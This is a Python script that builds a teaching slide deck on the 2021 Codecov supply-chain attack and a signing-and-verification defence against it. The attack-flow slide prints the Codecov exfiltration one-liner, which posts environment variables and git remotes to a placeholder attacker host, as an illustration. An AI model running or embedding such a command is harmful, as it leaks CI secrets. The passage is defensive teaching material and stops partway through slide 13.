"""Build the CCA presentation on the institute's PPT template (BCS701-ppt_format.pptx).

    python deliverables/tools/build_slides.py

Keeps the template's master (BMSIT banner, background), title slide and contents
slide; replaces the blank sample slides with the content slides + speaker notes.
"""

from __future__ import annotations

import copy
import json
from pathlib import Path

from lxml import etree
from pptx import Presentation
from pptx.dml.color import RGBColor
from pptx.enum.shapes import MSO_CONNECTOR, MSO_SHAPE
from pptx.enum.text import MSO_ANCHOR, PP_ALIGN
from pptx.oxml.ns import qn
from pptx.util import Emu, Inches, Pt

ROOT = Path(__file__).resolve().parents[2]
PROJ = ROOT / "secure-supply-chain"
DIAG = PROJ / "docs" / "diagrams"
RES = PROJ / "docs" / "results"
TEMPLATE = ROOT / "deliverables" / "templates" / "BCS701-ppt_format.pptx"
OUT = ROOT / "deliverables" / "INS_CCA_Presentation_Codecov_Supply_Chain.pptx"

TITLE = "Cryptographically Verified Software Supply Chain for Preventing Codecov-Style Supply-Chain Attacks"
NAVY, INK, MUTED = "1F3864", "222222", "56606B"
RED, RED_BG = "B42318", "FDECEA"
GREEN, GREEN_BG = "1A7F4B", "E3F4EA"
BLUE_BG, GRAY_BG, AMBER_BG, AMBER = "E6EFFA", "EEF1F4", "FFF4DE", "8A5A00"
LINE = "C5CDD6"
HEAD = "Times New Roman"
BODY = "Calibri"


def rgb(h):
    return RGBColor.from_string(h)


# ----------------------------------------------------------------------------- primitives
def _font(run, size, color=INK, bold=False, italic=False, font=BODY):
    run.font.size = Pt(size)
    run.font.bold = bold
    run.font.italic = italic
    run.font.name = font
    run.font.color.rgb = rgb(color)


def _bullet(paragraph, char="•", indent_emu=228600):
    pPr = paragraph._p.get_or_add_pPr()
    pPr.set("marL", str(indent_emu))
    pPr.set("indent", str(-indent_emu))
    for tag in ("a:buNone", "a:buChar", "a:buAutoNum"):
        for e in pPr.findall(qn(tag)):
            pPr.remove(e)
    bu = etree.SubElement(pPr, qn("a:buChar"))
    bu.set("char", char)


def text(slide, x, y, w, h, items, size=14, color=INK, font=BODY, bold=False, align=PP_ALIGN.LEFT,
         anchor=MSO_ANCHOR.TOP, bullets=False, space_after=4, margin=0.05, line=None):
    """items: str | list of str | list of (str, dict) ; inline **bold** supported."""
    tb = slide.shapes.add_textbox(Inches(x), Inches(y), Inches(w), Inches(h))
    tf = tb.text_frame
    tf.word_wrap = True
    tf.vertical_anchor = anchor
    for side in ("margin_left", "margin_right", "margin_top", "margin_bottom"):
        setattr(tf, side, Inches(margin))
    if isinstance(items, str):
        items = [items]
    for i, it in enumerate(items):
        opts = {}
        if isinstance(it, tuple):
            it, opts = it
        p = tf.paragraphs[0] if i == 0 else tf.add_paragraph()
        p.alignment = opts.get("align", align)
        p.space_after = Pt(opts.get("space_after", space_after))
        if line:
            p.line_spacing = line
        if opts.get("bullet", bullets):
            _bullet(p)
        parts = it.split("**")
        for k, part in enumerate(parts):
            if not part:
                continue
            r = p.add_run()
            r.text = part
            _font(r, opts.get("size", size), opts.get("color", color), bold=(k % 2 == 1) or opts.get("bold", bold),
                  italic=opts.get("italic", False), font=opts.get("font", font))
    return tb


def box(slide, x, y, w, h, fill="FFFFFF", line=LINE, shape=MSO_SHAPE.ROUNDED_RECTANGLE, radius=0.08, lw=1.0,
        dash=False):
    s = slide.shapes.add_shape(shape, Inches(x), Inches(y), Inches(w), Inches(h))
    s.fill.solid()
    s.fill.fore_color.rgb = rgb(fill)
    if line:
        s.line.color.rgb = rgb(line)
        s.line.width = Pt(lw)
        if dash:
            s.line.dash_style = 4  # dash
    else:
        s.line.fill.background()
    s.shadow.inherit = False
    if shape == MSO_SHAPE.ROUNDED_RECTANGLE:
        s.adjustments[0] = radius
    s.text_frame.text = ""
    return s


def label_box(slide, x, y, w, h, title, sub=None, fill="FFFFFF", line=LINE, tcolor=INK, size=12, sub_size=10,
              bold=True, dash=False):
    s = box(slide, x, y, w, h, fill, line, dash=dash)
    tf = s.text_frame
    tf.word_wrap = True
    tf.vertical_anchor = MSO_ANCHOR.MIDDLE
    for side in ("margin_left", "margin_right", "margin_top", "margin_bottom"):
        setattr(tf, side, Inches(0.04))
    p = tf.paragraphs[0]
    p.alignment = PP_ALIGN.CENTER
    r = p.add_run(); r.text = title; _font(r, size, tcolor, bold=bold)
    if sub:
        p2 = tf.add_paragraph(); p2.alignment = PP_ALIGN.CENTER
        r2 = p2.add_run(); r2.text = sub; _font(r2, sub_size, MUTED)
    return s


def arrow(slide, x1, y1, x2, y2, color="51606F", width=1.5, dash=False):
    c = slide.shapes.add_connector(MSO_CONNECTOR.STRAIGHT, Inches(x1), Inches(y1), Inches(x2), Inches(y2))
    c.line.color.rgb = rgb(color)
    c.line.width = Pt(width)
    ln = c.line._get_or_add_ln()
    tail = etree.SubElement(ln, qn("a:tailEnd"))
    tail.set("type", "triangle"); tail.set("w", "med"); tail.set("len", "med")
    if dash:
        prst = etree.SubElement(ln, qn("a:prstDash")); prst.set("val", "dash")
        ln.remove(prst); ln.insert(1, prst)
    return c


def table(slide, x, y, w, col_w, rows, size=11, header_fill=NAVY, row_h=0.3, color_cols=None):
    shape = slide.shapes.add_table(len(rows), len(rows[0]), Inches(x), Inches(y), Inches(w),
                                   Inches(row_h * len(rows)))
    t = shape.table
    tblPr = t._tbl.tblPr
    for attr in ("bandRow", "firstRow"):
        tblPr.set(attr, "0")
    style = tblPr.find(qn("a:tableStyleId"))
    if style is not None:
        tblPr.remove(style)
    for i, cw in enumerate(col_w):
        t.columns[i].width = Inches(cw)
    for ri, row in enumerate(rows):
        t.rows[ri].height = Inches(row_h)
        for ci, val in enumerate(row):
            cell = t.cell(ri, ci)
            cell.margin_left = cell.margin_right = Inches(0.06)
            cell.margin_top = cell.margin_bottom = Inches(0.025)
            cell.vertical_anchor = MSO_ANCHOR.MIDDLE
            cell.fill.solid()
            cell.fill.fore_color.rgb = rgb(header_fill if ri == 0 else ("FFFFFF" if ri % 2 else "F4F6F9"))
            tf = cell.text_frame
            tf.word_wrap = True
            p = tf.paragraphs[0]
            r = p.add_run(); r.text = str(val)
            col = "FFFFFF" if ri == 0 else INK
            bold = ri == 0
            if ri > 0 and color_cols and ci in color_cols:
                v = str(val).upper()
                if v.startswith(("BLOCK", "DENIED", "NO")):
                    col, bold = RED, True
                elif v.startswith(("DEPLOY", "PASS", "YES")):
                    col, bold = GREEN, True
            _font(r, size, col, bold=bold)
            _cell_borders(cell)
    return shape


def _cell_borders(cell, color="C5CDD6"):
    tcPr = cell._tc.get_or_add_tcPr()
    for tag in ("a:lnL", "a:lnR", "a:lnT", "a:lnB"):
        ln = etree.SubElement(tcPr, qn(tag)); ln.set("w", "6350")
        sf = etree.SubElement(ln, qn("a:solidFill")); c = etree.SubElement(sf, qn("a:srgbClr")); c.set("val", color)
    # schema order: borders must precede fill
    fill = tcPr.find(qn("a:solidFill"))
    if fill is not None:
        tcPr.remove(fill); tcPr.append(fill)


def picture(slide, path, x, y, w=None, h=None):
    kw = {}
    if w:
        kw["width"] = Inches(w)
    if h:
        kw["height"] = Inches(h)
    return slide.shapes.add_picture(str(path), Inches(x), Inches(y), **kw)


def stat(slide, x, y, w, h, big, small, color=NAVY, fill="FFFFFF"):
    box(slide, x, y, w, h, fill, LINE)
    text(slide, x, y + 0.12, w, h * 0.55, big, size=30, color=color, bold=True, align=PP_ALIGN.CENTER,
         font=HEAD, anchor=MSO_ANCHOR.MIDDLE)
    text(slide, x + 0.08, y + h * 0.58, w - 0.16, h * 0.4, small, size=11.5, color=MUTED, align=PP_ALIGN.CENTER)


def number_badge(slide, x, y, n, fill=NAVY, d=0.36):
    s = slide.shapes.add_shape(MSO_SHAPE.OVAL, Inches(x), Inches(y), Inches(d), Inches(d))
    s.fill.solid(); s.fill.fore_color.rgb = rgb(fill); s.line.fill.background(); s.shadow.inherit = False
    tf = s.text_frame
    for side in ("margin_left", "margin_right", "margin_top", "margin_bottom"):
        setattr(tf, side, 0)
    p = tf.paragraphs[0]; p.alignment = PP_ALIGN.CENTER; tf.vertical_anchor = MSO_ANCHOR.MIDDLE
    r = p.add_run(); r.text = str(n); _font(r, 13, "FFFFFF", bold=True)


# ----------------------------------------------------------------------------- deck
class Deck:
    def __init__(self):
        self.prs = Presentation(TEMPLATE)
        slides = list(self.prs.slides)
        self.layout = slides[0].slide_layout
        # footer placeholders (date bottom-left, number bottom-right) as used on the template's content slides
        self.footer_xml = [copy.deepcopy(sh._element) for sh in slides[2].shapes if sh.is_placeholder]
        # drop the template's blank sample slides (3 and 4)
        sld_ids = self.prs.slides._sldIdLst
        for sld_id in list(sld_ids)[2:]:
            self.prs.part.drop_rel(sld_id.rId)
            sld_ids.remove(sld_id)
        self.title_slide, self.contents_slide = slides[0], slides[1]

    def new(self, title, notes):
        s = self.prs.slides.add_slide(self.layout)
        for ph in list(s.placeholders):
            ph._element.getparent().remove(ph._element)
        for el in self.footer_xml:
            s.shapes._spTree.append(copy.deepcopy(el))
        text(s, 0.4, 0.8, 9.2, 0.62, title, size=28, color=NAVY, bold=True, font=HEAD, anchor=MSO_ANCHOR.MIDDLE)
        s.notes_slide.notes_text_frame.text = notes
        return s

    def save(self):
        self.prs.save(OUT)
        return OUT


def set_runs(shape, new_text):
    """Replace a template text box's text but keep the first run's formatting."""
    p = shape.text_frame.paragraphs[0]
    runs = p.runs
    runs[0].text = new_text
    for r in runs[1:]:
        r._r.getparent().remove(r._r)
    for extra in shape.text_frame.paragraphs[1:]:
        extra._p.getparent().remove(extra._p)


def build() -> Path:
    D = Deck()
    bench = json.loads((RES / "benchmark.json").read_text())["benchmark"]
    attacks = json.loads((RES / "attack_results.json").read_text())

    # ------------------------------------------------------------------ 1 title (template)
    s = D.title_slide
    shapes = {sh.name: sh for sh in s.shapes}
    set_runs(shapes["TextBox 7"], "CCA: Real-World Security Breach Analysis & Cryptographic Solution Design")
    tb7 = shapes["TextBox 7"]
    tb7.left, tb7.top, tb7.width, tb7.height = Inches(0.4), Inches(1.72), Inches(9.2), Inches(0.5)
    for r in tb7.text_frame.paragraphs[0].runs:
        r.font.size = Pt(20)
    tb10 = shapes["TextBox 10"]
    set_runs(tb10, "Case study: Codecov Bash Uploader supply-chain attack (2021)")
    tb10.left, tb10.top, tb10.width, tb10.height = Inches(0.4), Inches(2.2), Inches(9.2), Inches(0.4)
    for r in tb10.text_frame.paragraphs[0].runs:
        r.font.size = Pt(16); r.font.italic = True
    text(s, 0.6, 2.62, 8.8, 0.85, TITLE, size=21, color=NAVY, bold=True, font=HEAD, align=PP_ALIGN.CENTER,
         anchor=MSO_ANCHOR.MIDDLE)
    rect = shapes["Rectangle 6"]
    rect.top = Inches(3.62)
    text(s, 1.5, 4.02, 7.0, 0.95, [("Name 1 (USN)     Name 2 (USN)     Name 3 (USN)", {"align": PP_ALIGN.CENTER}),
                                   ("edit with your team's names and USNs", {"align": PP_ALIGN.CENTER, "size": 10,
                                                                             "italic": True, "color": MUTED})],
         size=15, color=INK, font=HEAD)
    g = shapes["TextBox 4"]
    g.top = Inches(5.05)
    text(s, 2.0, 5.42, 6.0, 0.8, [("Prof. Sonnegowda K", {"align": PP_ALIGN.CENTER, "bold": True}),
                                  ("Assistant Professor, Dept. of ISE, BMSIT&M", {"align": PP_ALIGN.CENTER, "size": 13})],
         size=16, color=INK, font=HEAD)
    s.notes_slide.notes_text_frame.text = (
        "Good morning. Our CCA case study is the 2021 Codecov Bash Uploader supply-chain attack. We analysed how it "
        "happened and designed and built a working prototype, a cryptographically verified software supply chain, "
        "that makes this attack fail automatically.")

    # ------------------------------------------------------------------ 2 contents (template)
    s = D.contents_slide
    shapes = {sh.name: sh for sh in s.shapes}
    body = shapes["TextBox 6"]
    agenda = ["Abstract & Objectives", "The Codecov Incident (2021)", "Attack Flow & Problem Statement",
              "Vulnerabilities & Security Requirements", "Proposed Architecture", "Cryptographic Design",
              "Key Management", "CI/CD Security Gate", "Attack Simulation & Live Demo", "Testing Results",
              "Innovation & Industry Relevance", "Conclusion & References"]
    paras = body.text_frame.paragraphs
    template_p = paras[0]._p
    for p in paras[1:]:
        p._p.getparent().remove(p._p)
    for i, item in enumerate(agenda):
        p_el = template_p if i == 0 else copy.deepcopy(template_p)
        if i:
            template_p.getparent().append(p_el)
        runs = p_el.findall(qn("a:r"))
        runs[0].find(qn("a:t")).text = item
        for r in runs[1:]:
            p_el.remove(r)
        runs[0].find(qn("a:rPr")).set("sz", "2000")
    body.left, body.top, body.width, body.height = Inches(1.3), Inches(1.6), Inches(7.6), Inches(5.3)
    s.notes_slide.notes_text_frame.text = "This is the flow of the talk: the incident first, then our design, implementation, testing and relevance."

    # ------------------------------------------------------------------ 3 abstract & objectives
    s = D.new("Abstract & Objectives",
              "In short: Codecov's uploader was modified in storage and leaked CI secrets for about two months. Our "
              "system signs every release, and customers' pipelines verify integrity and authenticity automatically, "
              "blocking anything tampered. These are our four objectives.")
    box(s, 0.4, 1.55, 4.55, 5.35, "FFFFFF")
    text(s, 0.55, 1.62, 4.3, 0.4, "Abstract", size=16, color=NAVY, bold=True, font=HEAD)
    text(s, 0.55, 2.02, 4.3, 4.8, [
        "In 2021 an attacker used a leaked cloud-storage credential to modify Codecov's **Bash Uploader**. For about "
        "two months it silently sent CI secrets to an external server, while being served over valid HTTPS.",
        "We built a **Cryptographically Verified Software Supply Chain**: SHA-256 + **Ed25519-signed manifests**, "
        "provenance, a **root-signed trust policy** (rotation / revocation), **TLS 1.3** distribution and a "
        "**fail-closed CI/CD security gate** with a hash-chained audit log.",
        f"Result: **{bench['tampered_detected']:,}/{bench['tampered_samples']:,}** tampered artifacts blocked (FAR 0 %), "
        f"~{bench['verification_ms_mean']:.1f} ms per verification.",
    ], size=14.5, space_after=12, line=1.05)
    objs = [("Analyse", "the documented Codecov incident: vector, timeline, violated requirements"),
            ("Design", "a supply chain where customers verify integrity AND authenticity"),
            ("Implement", "signing, key management, TLS 1.3, gate, audit log"),
            ("Validate", "attack simulations, 25 automated tests, FAR and timing")]
    for i, (h, d) in enumerate(objs):
        y = 1.6 + i * 1.33
        box(s, 5.2, y, 4.4, 1.18, "FFFFFF")
        number_badge(s, 5.35, y + 0.4, i + 1)
        text(s, 5.85, y + 0.1, 3.65, 0.35, h, size=15, color=NAVY, bold=True)
        text(s, 5.85, y + 0.45, 3.65, 0.7, d, size=12, color=INK)

    # ------------------------------------------------------------------ 4 the incident
    s = D.new("The Codecov Incident (2021)",
              "Codecov is a code-coverage SaaS used inside CI pipelines. From 31 January 2021 an attacker, using a "
              "credential extracted because of an error in Codecov's Docker image creation process, repeatedly "
              "modified the Bash Uploader. It was detected on 1 April when a customer's checksum did not match, and "
              "disclosed on 15 April. These are documented facts from Codecov's post-mortem.")
    rows = [["Attribute", "Documented facts"],
            ["Organisation / sector", "Codecov: code-coverage SaaS (DevOps tooling)"],
            ["Component", "Bash Uploader (also used by GitHub Action, CircleCI Orb, Bitrise Step)"],
            ["Compromise began", "31 January 2021 (periodic alterations)"],
            ["Detected", "1 April 2021: customer saw checksum mismatch"],
            ["Disclosed", "15 April 2021"],
            ["Initial access", "Docker image build error exposed an HMAC key for a GCS service account"],
            ["Impact", "CI env. variables (tokens, keys) + git remotes sent to attacker"]]
    table(s, 0.4, 1.55, 6.1, [1.75, 4.35], rows, size=11, row_h=0.56)
    stat(s, 6.75, 1.55, 2.85, 1.45, "~2 months", "undetected in customers' CI", color=RED)
    stat(s, 6.75, 3.15, 2.85, 1.45, "1 line", "of injected code was enough", color=RED)
    stat(s, 6.75, 4.75, 2.85, 1.45, "29,000+", "customers reported at the time", color=NAVY)
    text(s, 0.4, 6.4, 9.2, 0.35, [("Sources: Codecov security update [1]; Reuters [2]; HashiCorp HCSEC-2021-12 [3]",
                                   {"italic": True})], size=10, color=MUTED)

    # ------------------------------------------------------------------ 5 attack flow
    s = D.new("Attack Flow & Problem Statement",
              "The chain: a credential was exposed through a build artifact, used to change the release in storage, "
              "served from the genuine domain over HTTPS, and executed with full privileges in customer CI. This "
              "one line sent env and git remotes out. TLS protected the transfer of an already-malicious file, and "
              "the checksum only helped because one customer checked it by hand.")
    picture(s, DIAG / "codecov_attack.png", 0.4, 1.5, w=9.2)
    box(s, 0.4, 3.4, 9.2, 0.62, "FFF7F6", RED)
    text(s, 0.5, 3.43, 9.0, 0.56, 'curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://<attacker-ip>/upload/v2 || true',
         size=10.5, color=RED, font="Courier New", bold=True, anchor=MSO_ANCHOR.MIDDLE)
    for i, (h, d) in enumerate([
        ("Why HTTPS did not help", "TLS authenticates the server and protects bytes in transit. The malicious file was ON the genuine server."),
        ("Why the checksum did not help", "Hashing is not authentication. Checking was manual and optional; a checksum beside the file can be swapped too."),
    ]):
        x = 0.4 + i * 4.7
        box(s, x, 4.2, 4.5, 1.2, "FFFFFF")
        text(s, x + 0.12, 4.25, 4.3, 0.35, h, size=13.5, color=NAVY, bold=True)
        text(s, x + 0.12, 4.6, 4.3, 0.8, d, size=12)
    box(s, 0.4, 5.6, 9.2, 1.15, BLUE_BG, "9DB8D9")
    text(s, 0.55, 5.66, 8.95, 1.05, [
        ("Problem statement", {"bold": True, "color": NAVY, "size": 13.5}),
        "Automatically prove, before execution, that a vendor artifact is unmodified, signed by a trusted non-revoked "
        "key, not an old or revoked version, and built by an approved builder, even if the registry is compromised.",
    ], size=13, space_after=2)

    # ------------------------------------------------------------------ 6 vulnerabilities & requirements
    s = D.new("Vulnerabilities & Security Requirements",
              "Integrity was the primary requirement violated, together with authenticity. Confidentiality was lost "
              "because secrets were exfiltrated, and non-repudiation because there was no signed record of releases. "
              "Each vulnerability maps to a requirement and to a control in our design.")
    chips = [("Integrity (primary)", RED, RED_BG), ("Authenticity", RED, RED_BG), ("Confidentiality", RED, RED_BG),
             ("Non-repudiation", AMBER, AMBER_BG), ("Availability (2nd)", AMBER, AMBER_BG)]
    x = 0.4
    for name, fg, bg in chips:
        w = 0.25 + len(name) * 0.085
        label_box(s, x, 1.5, w, 0.4, name, fill=bg, line=fg, tcolor=fg, size=11.5)
        x += w + 0.12
    rows = [["Vulnerability (documented incident)", "Requirement", "Control in our design"],
            ["Credential recoverable from Docker image", "Storage access ≠ release authority", "Signing service: RBAC + MFA, HSM/KMS"],
            ["One credential could change a release", "Only authorised releases accepted", "Ed25519 manifest signature, trusted keys"],
            ["Script ran without verification", "Automatic, mandatory verification", "Fail-closed CI/CD security gate"],
            ["Checksum not authenticated / optional", "Integrity bound to authenticity", "SHA-256 inside signed manifest"],
            ["Script saw every CI secret", "Block exfiltration code", "Security tests + customer content scan"],
            ["~2 months undetected, no evidence", "Tamper-evident accountability", "Hash-chained audit log + events"]]
    table(s, 0.4, 2.15, 9.2, [3.2, 2.8, 3.2], rows, size=12.5, row_h=0.66)

    # ------------------------------------------------------------------ 7 architecture (native shapes)
    s = D.new("Proposed Architecture",
              "Three trust zones. The vendor zone builds, tests, hashes and signs inside a signing service. The "
              "distribution zone, meaning the registry and network, is treated as untrusted and only carries signed "
              "objects. The customer zone pins the vendor root key, verifies everything and then deploys or blocks. "
              "Every step is written to the hash-chained audit log.")
    zones = [(0.35, 3.05, "VENDOR  (trusted)", BLUE_BG, "8FB3D9"), (3.55, 2.55, "DISTRIBUTION  (untrusted)", GRAY_BG, "AAB4BE"),
             (6.25, 3.4, "CUSTOMER CI/CD", GREEN_BG, "94C9A9")]
    for x, w, name, fill, line in zones:
        box(s, x, 1.5, w, 4.75, fill, line, radius=0.04)
        text(s, x, 1.53, w, 0.3, name, size=11.5, color=NAVY, bold=True, align=PP_ALIGN.CENTER)
    vend = ["Developer (MFA)", "Source repository", "Secure build", "Security tests", "SHA-256 + provenance",
            "Signing service\nHSM/KMS · RBAC+MFA", "Signed manifest\n+ artifact"]
    ys = []
    y = 1.88
    for i, name in enumerate(vend):
        h = 0.62 if "\n" in name else 0.44
        t, sub = (name.split("\n") + [None])[:2]
        label_box(s, 0.55, y, 2.65, h, t, sub, fill="D6E6F7" if i == 5 else "FFFFFF", size=11.5, sub_size=9.5)
        ys.append((y, h))
        if i:
            py, ph = ys[i - 1]
            arrow(s, 1.875, py + ph, 1.875, y)
        y += h + 0.12
    label_box(s, 3.75, 2.6, 2.15, 0.75, "Artifact registry", "+ root-signed trust policy", size=11.5)
    label_box(s, 3.75, 3.95, 2.15, 0.55, "TLS 1.3 channel", fill="FFFFFF", size=11.5, dash=True)
    arrow(s, 3.2, ys[-1][0] + 0.31, 3.75, 3.0)
    arrow(s, 4.825, 3.35, 4.825, 3.95)
    label_box(s, 6.45, 1.9, 3.0, 0.55, "Customer CI", "pinned root public key", size=11.5, sub_size=9.5)
    arrow(s, 5.9, 4.22, 6.45, 2.3)
    box(s, 6.45, 2.62, 3.0, 1.62, "FFFFFF")
    text(s, 6.45, 2.64, 3.0, 0.3, "Verification engine", size=11.5, bold=True, align=PP_ALIGN.CENTER)
    checks = ["Signature", "SHA-256", "Key status", "Version", "Provenance", "Policy"]
    for i, c in enumerate(checks):
        cx, cy = 6.55 + (i % 3) * 0.95, 3.0 + (i // 3) * 0.6
        label_box(s, cx, cy, 0.88, 0.5, c, fill=GREEN_BG, line="94C9A9", size=9.5)
    arrow(s, 7.95, 2.45, 7.95, 2.62)
    label_box(s, 7.2, 4.45, 1.5, 0.45, "Security gate", fill="FFFFFF", size=11.5)
    arrow(s, 7.95, 4.24, 7.95, 4.45)
    label_box(s, 6.45, 5.2, 1.35, 0.55, "DEPLOY", fill="D5F0DE", line=GREEN, tcolor=GREEN, size=13)
    label_box(s, 8.1, 5.2, 1.35, 0.55, "BLOCK", "+ security event", fill="FBD9D6", line=RED, tcolor=RED, size=13,
              sub_size=9)
    arrow(s, 7.6, 4.9, 7.12, 5.2, GREEN)
    arrow(s, 8.3, 4.9, 8.78, 5.2, RED)
    label_box(s, 0.35, 6.38, 9.3, 0.45, "Hash-chained audit / transparency log: every signing operation and every DEPLOY / BLOCK decision",
              fill=AMBER_BG, line="C9A24B", tcolor=AMBER, size=11.5)

    # ------------------------------------------------------------------ 8 crypto design
    s = D.new("Cryptographic Design",
              "Each primitive has one clear job. SHA-256 is a fingerprint: it detects change but anyone can compute "
              "it. Ed25519 gives authenticity; only the vendor's private key can sign, and customers verify with "
              "the public key. TLS 1.3 protects the channel. We sign both the artifact and the manifest, with domain "
              "separation so one signature can't be reused for another purpose.")
    cards = [("SHA-256", "Integrity fingerprint", "Any 1-bit change gives a new digest. NOT authentication: anyone can hash a malicious file.", NAVY),
             ("Ed25519", "Authenticity + integrity", "Vendor signs with a private key that is never distributed; customers verify with the trusted public key.", GREEN),
             ("TLS 1.3", "Channel protection", "ECDHE + AES-GCM, server auth, no downgrade. Cannot prove the file on the server is genuine.", "5B4BB0")]
    for i, (h, sub, d, col) in enumerate(cards):
        x = 0.4 + i * 3.1
        box(s, x, 1.5, 2.95, 1.85, "FFFFFF")
        text(s, x + 0.12, 1.55, 2.7, 0.4, h, size=18, color=col, bold=True, font=HEAD)
        text(s, x + 0.12, 1.95, 2.7, 0.3, sub, size=12, color=MUTED, bold=True)
        text(s, x + 0.12, 2.27, 2.75, 1.05, d, size=11.5)
    picture(s, DIAG / "crypto_flow.png", 1.2, 3.48, w=7.6)
    text(s, 0.4, 6.72, 9.2, 0.3, [("Domain-separated signatures over canonical JSON  ·  PKI: pinned root key → release keys  ·  AES-256 only for keys at rest",
                                      {"italic": True})], size=10.5, color=MUTED, align=PP_ALIGN.CENTER)

    # ------------------------------------------------------------------ 9 key management
    s = D.new("Key Management",
              "A two-tier hierarchy like TUF. The offline root key signs only the trust policy, and customers pin "
              "its public key once. Release keys sign artifacts and can be rotated or revoked by publishing a new "
              "signed policy. The policy expires and has a version number, so an old one can't be replayed. In "
              "production the private keys live in an HSM or cloud KMS.")
    picture(s, DIAG / "key_management.png", 0.4, 1.5, w=9.2)
    items = [("Generation", "Ed25519 from OS CSPRNG; key_id = SHA-256(pubkey)"),
             ("Protection", "AES-256 encrypted PKCS#8, 0600 → HSM / cloud KMS in production"),
             ("Distribution", "Release keys in root-signed trust policy; root key pinned"),
             ("Rotation", "Old key → retired (valid for older releases), new key → active"),
             ("Revocation", "Key revoked + destroyed; everything it signed is rejected"),
             ("Audit", "Every generate / rotate / revoke / sign (and denied attempt) logged")]
    for i, (h, d) in enumerate(items):
        x, y = 0.4 + (i % 3) * 3.1, 3.6 + (i // 3) * 1.6
        box(s, x, y, 2.95, 1.45, "FFFFFF")
        text(s, x + 0.12, y + 0.08, 2.7, 0.35, h, size=15, color=NAVY, bold=True)
        text(s, x + 0.12, y + 0.47, 2.75, 0.95, d, size=13.5)

    # ------------------------------------------------------------------ 10 security gate
    s = D.new("CI/CD Security Gate",
              "This is the continuous security gate. The same policy runs from build to deploy. The customer gate "
              "runs ten checks and returns exit code 0 to deploy or 1 to block, so it plugs into any CI system. On a "
              "block it raises a security event and writes to the audit log.")
    picture(s, DIAG / "pipeline_gate.png", 0.6, 1.45, w=8.8)
    rows = [["#", "Check", "Blocks with", "#", "Check", "Blocks with"],
            ["1", "Trust policy (root sig, expiry)", "INVALID_TRUST_POLICY", "6", "SHA-256 recomputed", "HASH_MISMATCH"],
            ["2", "Manifest schema", "INVALID_MANIFEST", "7", "Artifact signature", "INVALID_SIGNATURE"],
            ["3", "Signer in trust policy", "UNAUTHORIZED_KEY", "8", "Version revoked / rollback", "REVOKED / REPLAY_BLOCKED"],
            ["4", "Key status", "REVOKED", "9", "Provenance", "INVALID_PROVENANCE"],
            ["5", "Manifest signature", "INVALID_SIGNATURE", "10", "Policy + content scan", "POLICY_VIOLATION"]]
    table(s, 0.4, 3.75, 9.2, [0.3, 2.15, 2.15, 0.35, 2.05, 2.2], rows, size=10.5, row_h=0.42)
    text(s, 0.4, 6.4, 9.2, 0.35, [("python -m ci.security_gate verify ...   →   exit 0 = DEPLOY  ·  exit 1 = BLOCK",
                                   {"font": "Courier New"})], size=11, color=NAVY, align=PP_ALIGN.CENTER)

    # ------------------------------------------------------------------ 11 attack simulation
    s = D.new("Attack Simulation & Live Demo",
              "Live demo: python demo.py. A legitimate release passes. I add the Codecov line after signing: the "
              "download over TLS 1.3 still succeeds, but the SHA-256 mismatches, the signature fails and the gate "
              "blocks. Every attacker variant is blocked, including a stolen key. Everything runs locally; the "
              "exfiltration URL is .invalid and the script is never executed.")
    pick = ["1", "2", "2b", "3a", "3b", "3d", "3c-", "3c", "4b", "5", "6"]
    amap = {a["id"]: a for a in attacks}
    rows = [["Scenario", "Attacker action", "Gate result"]]
    names = {"1": "Legitimate release v1.0.0", "2": "Codecov-style line added after signing",
             "2b": "…and SHA-256 in manifest replaced", "3a": "Re-signed with attacker's own key",
             "3b": "Attacker claims vendor key ID", "3d": "Developer (no role) tries to sign",
             "3c-": "Stolen real key signs payload", "3c": "…after the key is revoked",
             "4b": "Replay revoked old version", "5": "Registry edits trust policy",
             "6": "Legitimate release restored"}
    for k in pick:
        a = amap[k]
        rows.append([{"3c-": "3c (i)", "3c": "3c (ii)"}.get(k, k), names[k], f"{'DEPLOY' if a['actual'] == 'DEPLOY' else 'BLOCK'}  ·  {a['status_code']}"])
    table(s, 0.4, 1.5, 6.15, [0.75, 2.95, 2.45], rows, size=10.5, row_h=0.4, color_cols={2})
    box(s, 6.75, 1.5, 2.85, 4.8, "FFFFFF")
    text(s, 6.87, 1.56, 2.65, 0.35, "5-minute live demo", size=14, color=NAVY, bold=True)
    steps = ["Show architecture", "Build, hash, sign v1.0.0", "Download over TLS 1.3 → PASS", "Inject 1 line after signing",
             "SHA-256 mismatch", "Signature failure", "Gate BLOCKS + event", "Audit log (chain intact)",
             "Revoke key", "New release → PASS"]
    text(s, 6.87, 1.95, 2.65, 3.9, [(f"{i + 1}. {st}", {}) for i, st in enumerate(steps)], size=11.5, space_after=3)
    text(s, 6.87, 5.72, 2.65, 0.5, [("python demo.py", {"font": "Courier New", "bold": True})], size=12, color=NAVY)
    box(s, 0.4, 6.3, 6.15, 0.5, GREEN_BG, "94C9A9")
    text(s, 0.5, 6.32, 6.0, 0.46, "Safe: local only · exfiltration URL uses .invalid · tampered script is never executed",
         size=11, color=GREEN, bold=True, anchor=MSO_ANCHOR.MIDDLE)

    # ------------------------------------------------------------------ 12 testing results
    s = D.new("Testing Results",
              f"All 25 automated tests pass, and all 14 attack scenarios behaved as expected. We mutated the artifact "
              f"{bench['tampered_samples']} times at random (bit flips, inserted or deleted bytes, appended "
              f"exfiltration lines) and every one was rejected, a false-acceptance rate of zero. Verification takes "
              f"about {bench['verification_ms_mean']:.1f} milliseconds, and even a 10 MB artifact takes tens of "
              f"milliseconds.")
    stats = [("25 / 25", "automated tests passed", GREEN), ("14 / 14", "attack scenarios as expected", GREEN),
             ("0 %", f"false acceptance ({bench['tampered_samples']:,} tampered)", RED),
             (f"{bench['verification_ms_mean']:.1f} ms", "per full verification", NAVY)]
    for i, (big, small, col) in enumerate(stats):
        stat(s, 0.4 + i * 2.33, 1.5, 2.17, 1.5, big, small, color=col)
    picture(s, RES / "verification_cost.png", 0.4, 3.2, w=5.9)
    box(s, 6.5, 3.2, 3.1, 3.2, "FFFFFF")
    text(s, 6.62, 3.25, 2.9, 3.1, [
        ("Covered test cases", {"bold": True, "color": NAVY, "size": 13}),
        ("Valid artifact → PASS", {"bullet": True}), ("Modified artifact / manifest → BLOCK", {"bullet": True}),
        ("Invalid signature, wrong key → BLOCK", {"bullet": True}), ("Revoked key, replay → BLOCK", {"bullet": True}),
        ("Unauthorised signer → DENIED", {"bullet": True}), ("TLS 1.2 downgrade → refused", {"bullet": True}),
        ("Audit-log edit → chain BROKEN", {"bullet": True}), ("New release after rotation → PASS", {"bullet": True}),
    ], size=11.5, space_after=3)

    # ------------------------------------------------------------------ 13 innovation
